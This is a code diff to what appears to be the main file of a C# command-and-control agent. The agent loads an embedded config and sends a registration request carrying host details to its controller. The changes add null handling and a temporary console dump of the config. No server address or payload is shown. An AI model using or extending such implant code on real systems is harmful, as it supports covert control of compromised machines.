@@ -3,10 +3,12 @@ using Agent.Models;
 using Agent.Services;
 using System.Collections.Concurrent;
 using System.Diagnostics;
+using System.IO;
 using System.IO.Pipes;
 using Agent.ModuleBase;
 using Agent.Models.C2Request;
 using System.Text.Json;
+using System;
 
 AgentInformationService agentInformationService = new AgentInformationService();
 
@@ -22,11 +24,18 @@ var agentInfo = await agentInformationService.GetAgentInfoAsync();
 // Load the embedded config
 var baseConfig = ConfigLoader.LoadEmbeddedConfig();
 
-// Initialize baseConfig agentID and other variables
+
 if (agentInfo is not null)
 {
-    baseConfig.AgentId = agentInfo.AgentId;
+    baseConfig.AgentId = agentInfo.AgentId ?? string.Empty;
 }
+
+// TEMP
+string jsonOutput = JsonSerializer.Serialize(baseConfig);
+
+// Write the JSON output to the console
+Console.WriteLine(jsonOutput);
+//
 
 var delay = baseConfig.Sleep;
 var jitter = baseConfig.Jitter;
@@ -34,7 +43,7 @@ var jitter = baseConfig.Jitter;
 // Contact request 
 var request = new C2Request
 {
-    AgentId = baseConfig.AgentId,
+    AgentId = baseConfig.AgentId ?? string.Empty,
     AgentStatus = AgentStatus.Stage1,
     Reason = C2RequestReason.Register,
     Message = JsonSerializer.Serialize(agentInfo)
